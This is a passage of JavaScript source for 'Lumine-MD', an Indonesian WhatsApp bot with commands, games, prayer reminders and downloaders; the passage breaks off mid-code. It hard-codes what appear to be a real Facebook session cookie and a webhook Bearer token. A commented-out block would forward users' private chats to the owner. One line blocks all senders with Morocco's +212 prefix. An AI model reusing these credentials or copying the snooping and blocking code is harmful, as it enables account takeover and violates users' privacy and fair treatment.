/*
    Sc Lumine-MD V5.0
    My Contact 0895-0808-2845
    
    Notes:
    BUKAN BUAT DIJUAL LAGI !!!
   
*/

require('./koi')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, InteractiveMessage,generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require('fs')
const nodeCron = require("node-cron");
const FormData = require('form-data');
const formData = new FormData();
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { apikey } = require('./apikey.json')
const { color, bgcolor } = require('./lib/color')
const { ssweb } = require('./lib/ssweb')
const Spotify = require('./lib/Spotify')
const y2mate = require('./lib/ytdl')
const { getAccessToken, searchSpotify, formatSearchResults } = require('./lib/spotifySearch')
const { remini } = require('./lib/remini')
const { quote } = require('./lib/quote')
const { translate } = require('@vitalets/google-translate-api')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const uploadImage = require('./lib/uploadImage')
const primbon = new Primbon()
const hxz = require('hxz-api')
const jsobfus = require('javascript-obfuscator')
const cheerio = require('cheerio')
const ytdl = require("@distube/ytdl-core")
const speed = require('performance-now')
const emojiRegex = require('emoji-regex');
const { performance } = require('perf_hooks')
const { exec, spawn, execSync } = require("child_process")
const { mediafireDl } = require('./database/mediafire.js')
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredPremiumCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premium')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/list')
const { smsg, tanggal, getTime, formatp, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { koi_antispam } = require('./lib/antispam')
// read database
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
setting: {},
others: {},
sticker: {},
...(global.db.data || {})
}
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let db_respon_list = JSON.parse(fs.readFileSync('./src/list.json'));
let giveawayStatus = false;
let giveawayName = '';
let giveawayUser = {};

const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const chara = JSON.parse(fs.readFileSync('./datakoi/cai_id.json'))
const thumbnail = fs.readFileSync ('./datakoi/image/thumb.jpg')
const thumb = fs.readFileSync ('./datakoi/image/thumb.jpg')
const kalimage = fs.readFileSync ('./datakoi/image/thumb.jpg')
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const owner = JSON.parse(fs.readFileSync('./owner.json'))
const premium = JSON.parse(fs.readFileSync('./premium.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const chatbot = JSON.parse(fs.readFileSync("./lib/chatbot.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const banned = JSON.parse(fs.readFileSync('./datakoi/db/banned.json'))
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))

// Get Database
const isContacts = contacts.includes(m.sender)

module.exports = qyuunee = async (qyuunee, m, chatUpdate, store) => {
 try {
 const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
const body = (m && m.mtype) ? (
m.mtype === 'conversation' ? m.message?.conversation :
m.mtype === 'imageMessage' ? m.message?.imageMessage?.caption :
m.mtype === 'videoMessage' ? m.message?.videoMessage?.caption :
m.mtype === 'extendedTextMessage' ? m.message?.extendedTextMessage?.text :
m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
m.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m.msg.selectedId, chatUpdate) :
m.mtype === 'messageContextInfo' ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) :
    ''
) : '';
async function appenTextMessage(text, chatUpdate) {
        let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
            userJid: qyuunee.user.id,
            quoted:m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, qyuunee.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'}
qyuunee.ev.emit('messages.upsert', msg)}       
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!™©®Δ^βα~¦|/\\©^]/gi) : '.'

const isCmd = budy.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const longkap = body.replace(command, '')
const args = body.trim().split(/ +/).slice(1)
const full_args = body.replace(command, '').slice(1).trim()
const full_args2 = body.replace(longkap, '').slice(1).trim()
const spychat = body.replace().slice().trim()
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const koix = (m.quoted || m)
const quoted = (koix.mtype == 'buttonsMessage') ? koix[Object.keys(koix)[1]] : (koix.mtype == 'templateMessage') ? koix.hydratedTemplate[Object.keys(koix.hydratedTemplate)[1]] : (koix.mtype == 'product') ? koix[Object.keys(koix)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const botNumber = await qyuunee.decodeJid(qyuunee.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium= isCreator || checkPremiumUser(m.sender, premium)
expiredPremiumCheck(isCreator, m, premium)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const frommeky = m.key.remoteJid
const groupMetadata = m.isGroup ? await qyuunee.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const ChatBot = m.isGroup ? chatbot.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const isBan = banned.includes(m.sender)
const isUser = pengguna.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
/*const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false*/
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const bii = JSON.parse(fs.readFileSync('./datakoi/db/anjay.json').toString())
const isSeler = [botNumber, ...bii].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtod = m.quoted? "true":"false"
const more = String.fromCharCode(8206)
const readmore = more.repeat(4800)
const chatId = m.chat;
const owned = `${global.owner}@s.whatsapp.net`
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        
        if (!qyuunee.public) {
if (!m.key.fromMe && !isCreator) return
}

if (m.fromMe) return

// Pemberitahuan system
qyuunee.autoshalat = qyuunee.autoshalat ? qyuunee.autoshalat : {};
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? qyuunee.user.id : m.sender;
let id = m.chat;
if (id in qyuunee.autoshalat) {
return false;
}
let jadwalSholat = {
Shubuh: "04:43",
Dhuha: "06:30",
Dzuhur: "11:59",
Ashar: "15:21",
Magrib: "17:54",
Isya: "19:07",
};
const datek = new Date(
new Date().toLocaleString("en-US", {
timeZone: "Asia/Jakarta",}),
);
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
let caption = `*👋🏻 Hai kak ${pushname}...*\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat\n\n*>> ${waktu} <<*\n\n*Untuk wilayah Jakarta dan sekitarnya.*`;
let me = m.sender
qyuunee.autoshalat[id] = [
msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: caption
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ""
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/38c0f9fc50661ed27f9c5.jpg' }}, { upload: qyuunee.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Baiklah~","id":""}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [me], 
                  forwardingScore: 999,
                  isForwarded: false
                }
        })
    }
  }
}, {}),
qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
}),
setTimeout(async () => {
delete qyuunee.autoshalat[m.chat];
}, 57000),];
}}
    const cron = require('node-cron')
    
    /*cron.schedule("00 5 * * *", () => {
qyuunee.sendMessage(m.chat, { text : '*`<!> Bangun-bangun, sudah subuh mari kita beraktivitas`*', mentions: participants.map(a => a.id)})
}, {scheduled: true, timezone: "Asia/Jakarta"});*/

cron.schedule('00 22 * * *', async () => {
const getGroups = await qyuunee.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*`<!> Group otomatis di tutup\nSekarang saatnya tidur 😴*`'
if (groups.some(v => v === frommeky) && !(await qyuunee.groupMetadata(frommeky)).announce) {
qyuunee.groupSettingUpdate(frommeky, 'announcement').then(() => qyuunee.sendMessage(frommeky, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('10 5 * * *', async () => {
const getGroups = await qyuunee.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let texct = '*`<!> Group otomatis di buka lagi\nSamat beraktifitas 🤗*`'
if (groups.some(v => v === frommeky) && (await qyuunee.groupMetadata(frommeky)).announce) {
qyuunee.groupSettingUpdate(frommeky, 'not_announcement');
qyuunee.sendMessage(frommeky, {text: texct, mentions: Object.values(global.db.groups[frommeky].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
qyuunee.groupRequestParticipantsList(frommeky).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await qyuunee.groupRequestParticipantsUpdate(frommeky, [i.jid], 'approve')
await sleep(2300)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })
    // ========= //
    
const cap = 'KOI'
try {
pplu = await qyuunee.profilePictureUrl(anu.id, 'image')
} catch {
pplu = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
const koi = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Koi,;;;\nFN: Lumine-MD\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': pplu,
                    thumbnail: pplu,
                    sendEphemeral: true
                }   
            }
        }

const koi2 = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "extendedTextMessage": {
            "text": ucapanWaktu,
            "title": ``,
            "thumbnailUrl": pplu
        }
    }
}

const reply = (teks) => {
qyuunee.sendMessage(from, { text: teks, contextInfo: {
            mentionedJid: [],
            groupMentions: [],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363201331652484@newsletter',
               newsletterName: "🕊️ Follow Channel Aku (^^)/~~~",
                serverMessageId: -1
            },
            forwardingScore: 256,
externalAdReply: {
        showAdAttribution: true,
        title: `✿ ルミネ 6.0 - KOI ✿`,
        body: `Hosting Panel? Chat Owner :3`,
        thumbnailUrl: `https://telegra.ph/file/fb89484fd03a7b918ad36.jpg`,
        sourceUrl: "https://wa.me/6289508082845",
        mediaType: 1,
        renderLargerThumbnail: false
          }
        }}, { quoted: koi })}

const reply2 = (teks) => {
qyuunee.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `DON'T SPAM !!!`,"body": `${ucapanWaktu}`, "previewType": "PHOTO","thumbnail": thumb,"sourceUrl": `https://koi.pics`}}}, { quoted: m })}

const onlygc = () => {
qyuunee.sendMessage(m.chat, {
    text: `ʜɪɪ, ɪ'ᴍ ʟᴜᴍɪɴᴇ-ᴍᴅ ᴀ ᴍᴜʟᴛɪᴘᴜʀᴘᴏsᴇ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ ᴛʜᴀᴛ ᴄᴀɴ ᴍᴀᴋᴇ ɪᴛ ᴇᴀsɪᴇʀ ғᴏʀ ʏᴏᴜ ᴛᴏ sᴏʟᴠᴇ ᴘʀᴏʙʟᴇᴍs ᴡɪᴛʜ ᴛʜᴇ ɪɴᴛᴇʀɴᴇᴛ ϙᴜɪᴄᴋʟʏ.\n\nɪᴅɴ:
ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ʙᴏᴛ, ᴋᴀᴍᴜ ᴅɪʜᴀʀᴀᴘᴋᴀɴ ᴍᴇᴍᴀsᴜᴋɪ ɢʀᴜᴘ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ\n\nᴍᴀᴜ sᴄʀɪᴘᴛ/sᴄ ɴʏᴀ? ᴋᴇᴛɪᴋ ${prefix}sᴄ ᴅɪ ɢʀᴜᴘ ʙᴏᴛ\n\n◦  *ᴠᴇʀꜱɪᴏɴ :* 5.0\n◦  *ᴀᴜᴛʜᴏʀ :* ϙʏᴜᴜɴᴇᴇ - ᴋᴏɪ\n◦  *ꜱʜᴏᴡ ᴍᴇɴᴜ :* .ᴍᴇɴᴜ\n◦  *ᴡᴇʙsɪᴛᴇ :* https://ikankoi.my.id`,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu}`,
        body: "Lumine-MD",
        thumbnailUrl: "https://telegra.ph/file/04baa850b00dec76de06c.jpg",
        sourceUrl: "https://chat.whatsapp.com/CjxuywuwOglE7p2tFBqdH3",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   qyuunee.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/private.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
   }
   
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
                if (!isNumber(user.exp)) user.exp = 0
                if (!isNumber(user.level)) user.level = 0
                if (!('autolevelup' in user)) user.autolevelup = true
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
                exp: 0,
                level: 0,
                autolevelup: true
            }
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('cai' in chats)) chats.cai = true
                if (!('lumine' in chats)) chats.lumine = false
                if (!('antibot' in chats)) chats.antibot = false
                if (!('selfgc' in chats)) chats.selfgc = false
                if (!('mute' in chats)) chats.mute = false
                if (!('wlcm' in chats)) chats.wlcm = true
                if (!('nsfw' in chats)) chats.nsfw = false
                if (!('antispam' in chats)) chats.antispam = false
                if (!('antiviewonce' in chats)) chats.antiviewonce = false
                if (!('antitoxic' in chats)) chats.antitoxic = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antichannel' in chats)) antichannel = false
                if (!('antilinkyt' in chats)) chats.antilinkyt = false
                if (!('antilinktt' in chats)) chats.antilinktt = false
                if (!('antivirtex' in chats)) chats.antivirtex = true
                if (!('antipanel' in chats)) chats.antipanel = false
                if (!('antilinkv2' in chats)) chats.antilinkv2 = true
                if (!('autodown' in chats)) chats.autodown = false
                if (!('notification' in chats)) chats.notification = {}
            } else global.db.data.chats[m.chat] = {
                cai: true,
                lumine: false,
                antibot: false,
                selfgc: false,
                mute: false,
                antiviewonce: false,
                antispam: false,
                wlcm: true,
                nsfw: false,
                antitoxic: false,
                antilink: false,
                antichannel: false,
                antilinkyt: false,
                antilinktt: false,
                antivirtex: true,
                antipanel: false,
                antilinkv2: true,
                autodown: false,
                notification: {
                     status: false,
                     text_left: '',
                     text_welcome:''
                  }
            }
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (!('autobio' in setting)) setting.autobio = false
                if (!('autoread' in setting)) setting.autoread = false
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: true
            }

        } catch (err) {
            console.error(err)
        }
        
        cron.schedule('02 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        });

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function formatDuration(ms) {
  let seconds = Math.floor((ms / 1000) % 60);
  let minutes = Math.floor((ms / (1000 * 60)) % 60);
  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}

function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return {...b[i], [property]: a[property] === undefined ? _default : a[property]}
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

if (m.sender.startsWith('212')) return qyuunee.updateBlockStatus(m.sender, 'block')

if (m.message) {
if (global.db.data.settings[botNumber].autoread) {
qyuunee.readMessages([m.key])
}
}

if (spychat) {
if (!m.isGroup) return reach2()
/*caibot(`${spychat}`)*/
/*qyuunee.sendMessage('6289508082845' + "@s.whatsapp.net", { text: `▧ 「 *S P Y - C O M M A N D* 」\n│ ∘  *From*: ${m.sender.split("@")[0]}\n│ ∘  *Chat*: ${spychat}\n╰──────────────━` }, { quoted: koi });*/
}

async function alicia(text, username, ) {
  const payload = {
    app: {
      id: "bzj9iltifgl1702559592646",
      time: Date.now(),
      data: {
        sender: { id: username },
        message: [{
          id: Date.now(),
          time: Date.now(),
          type: "text",
          value: text
        }]
      }
    }
  };

  const webhookUrl = 'https://webhook.botika.online/webhook/';
  const headers = {
      "Content-Type": "application/json",
      "Authorization": "Bearer k9h0w5-ka5e-8ipt1o777dtlprbg-ecdkorjyg0-2y6exc3r"
  };

  try {
    const { data, status } = await axios.post(webhookUrl, payload, { headers });

    if (status === 200) {
      if (data.app && data.app.data && data.app.data.message) {
        const responseMessages = data.app.data.message.map(message => message.value);
        let replyMessage = responseMessages.join('\n');

        if (/(<BR>|<br>)/i.test(replyMessage)) {
          replyMessage = replyMessage.replace(/<BR>|<br>/gi, '\n').replace(/```/g, '\n');
          return replyMessage.split('\n').map(message => `\n\n${message}\n`).join('');
        } else {
          return replyMessage;
        }
      }
    }
  } catch (error) {
    console.error('Error:', error);
  }

  return "Aku tidak mengerti";
}

async function openai(text, user) {
    let hasil = await alicia(text, user);
    for (let i = 0; i < 3 && hasil === "Maaf, aku belum mengerti dengan pertanyaanmu. Bisa kamu menjelaskannya lagi?"; i++) {
        hasil = await alicia(text, user);
    }
    return hasil;
}

/* `
*/

async function caibot(spychat) {
const C = require('node-fetch')
try {
        const V = await C("https://cih-cai-jir.koi.pics/cai?char=yerYQvGVUH20FJ5Qz44IClXA6xa1uyFdYc1l4FTH8j8" + "&message=" + encodeURIComponent(spychat));
        const L = await V.json();
        const U = L.reply;
        qyuunee.sendMessage(m.chat, {text: `${U}`}, {quoted:m})
      } catch (H) {
        console.error("Error sending request:", H);
      }
  }

if (spychat) {
const { color } = require('./lib/color')
const moment = require("moment-timezone")
const { canLevelUp } = require('./lib/levelling')
		let user = global.db.data.users[m.sender]
		if (!user.autolevelup) return !0
		let before = user.level * 1
		while (canLevelUp(user.level, user.exp, global.multiplier)) user.level++
		if (before !== user.level) {
			let chating = `🥳 Congratulations ${pushname}, you have leveled up!
*${before}* -> *${user.level}*
Use *.profile* to check`
			reply(chating)
			console.log(color(chating, 'pink'))
		}
	}

const cookiesString =  `datr=fbLJZDRr5K8tKeDrtlnC_C13;sb=c4DcZI9hl5a7V39ExkNwMmQX;ps_n=1;ps_l=1;vpd=v1%3B737x381x2.8375000953674316;c_user=100028738117945;xs=39%3AO9S9_C18r_mVFA%3A2%3A1721953820%3A-1%3A12517;m_page_voice=100028738117945;fbl_st=101328545%3BT%3A28699238;wl_cbv=v2%3Bclient_version%3A2571%3Btimestamp%3A1721954308;fr=17b3KpHS2wiRL6NcF.AWWqZxFDGuXRSUGEJ9blju3DHNA.BmttBI..AAA.0.0.BmttBI.AWVTL1-d048;dpr=2.8375000953674316;`
const cookies = cookiesString.split(';').map(cookie => {
  const [name, ...value] = cookie.split('=');
  return {
    name: name.trim(),
    value: value.join('=').trim(),
  };
});

// console.log(cookies);

const agentOptions = {
  pipelining: 5,
  maxRedirections: 0,
 
};

// agent should be created once if you don't want to change your cookie
const agent123 = ytdl.createAgent(cookies, agentOptions);

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link,{agent123});
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly', requestOptions: { agent123 } })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await qyuunee.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link,{agent123});
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link,{agent123})
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await qyuunee.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

async function loading () {
var neekoi = [
"_Hallo My Name Is Lumine-MD_",
"_Script By : QyuuNee_",
"_🕊️ Thank You For Waiting..._",
]
let { key } = await qyuunee.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'},  { quoted: koi })

for (let i = 0; i < neekoi.length; i++) {
await sleep(100)
await qyuunee.sendMessage(from, {text: neekoi[i], edit: key }, { quoted: koi });
}
}

function pickMoji(list) {
     return list[Math.floor(Math.random() * list.length)]
  }
  
async function reach2 () {
await qyuunee.sendMessage(from, { react: { text: `${pickMoji(['🙄','🤯','🗿','💬','🤨','🥵','😰','🗣️','🥴','😐','👆','😔','👀','😋','🥶','💯','🔥','👍','❓️','⏳️','😂','🤣','🥰','❤️','💀','💦','😎','🤫','👌🏻','💥','🤙'])}`,key: m.key,}})
/*var oke = [
``
]
let reactionMessage = {
                    react: {
                        text: oke,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                qyuunee.sendMessage(m.chat, reactionMessage)*/
}
  
async function reach () {
var kayy = [
`${pickMoji(['🙄','🤯','🗿','💬','🤨','🥵','😰','🗣️','🥴','😐','👆','😔','👀','😋','🥶','💯','🔥','👍','❓️','⏳️','😂','🤣','🥰','❤️','💀','💦','😎','🤫','👌🏻','💥','🤙'])}`
]
let { key } = await qyuunee.sendReact(m.chat, `${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','👍','❓️','😸','💥','🤙'])}`, m.key)//Pengalih isu

for (let i = 0; i < kayy.length; i++) {
await sleep(65)
await qyuunee.sendReact(m.chat, kayy[i], m.key)
//PESAN LEPAS
}
}

if (autodelete) {
qyuunee.sendMessage(m.chat, { delete: m.key })
}

/*let reactionMessage = {
                    react: {
                        text: `👁️‍🗨️`,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                qyuunee.sendMessage(m.chat, reactionMessage)*/

const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
if (m.message) {
console.log(chalk.yellow.bgCyan.bold(botname), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

if (isCmd && !isUser) {
pengguna.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
}

/*
if (db.data.chats[m.chat].notification.status) {
            qyuunee.ev.on('group-participants.update', async (anu) => {
            //console.log(anu)
               try {
                  let metadata = await qyuunee.groupMetadata(anu.id)
                  let par = anu.participants
                  for (let i of par) {
                     let ppuser = await qyuunee.profilePictureUrl(i, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                     if (anu.action == 'add') {
                    qyuunee.sendMessage(anu.id, {
